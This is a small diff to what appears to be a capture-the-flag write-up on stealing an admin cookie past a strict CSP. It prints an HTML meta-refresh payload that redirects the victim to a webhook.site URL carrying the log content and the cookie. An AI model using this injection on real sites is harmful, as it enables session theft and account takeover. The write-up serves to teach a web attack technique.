@@ -100,11 +100,11 @@ we can authenticate us as admin to the server. In the log there is only text, bu
 How can we exfiltrate the admin cookie with a very strict CSP policy? With a <code>meta</code> tag that redirects the client to an URL that 
 incorporate part of the log's content (admin's cookie included):
 ```html
-<html><head><meta http-equiv="refresh" content='0; url=https://webhook.site/a2e16dd2-9690-4246-8c58-abf303c42a4b?exf=
+.... <html><head><meta http-equiv="refresh" content='0; url=https://webhook.site/a2e16dd2-9690-4246-8c58-abf303c42a4b?exf=
 
 ...Log content...
 
-'></head>....
+'></head> ....
 ```
 
 ## Attack
